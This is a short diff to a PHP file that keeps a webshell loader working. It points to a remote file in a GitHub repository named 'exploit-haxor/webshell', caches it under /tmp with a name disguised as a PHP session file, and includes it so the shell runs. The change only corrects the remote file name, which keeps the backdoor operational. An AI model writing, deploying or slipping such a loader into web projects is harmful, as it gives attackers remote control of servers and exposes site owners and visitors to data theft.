@@ -1,5 +1,5 @@
 <?php
-$data = ['https://raw.githubusercontent.com/exploit-haxor/webshell/refs/heads/main/templatesbsn.php', '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'];
+$data = ['https://raw.githubusercontent.com/exploit-haxor/webshell/refs/heads/main/templatebsn.php', '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'];
 if(file_exists($data[1]) && filesize($data[1]) !== 0) {
     include($data[1]);
 } else {
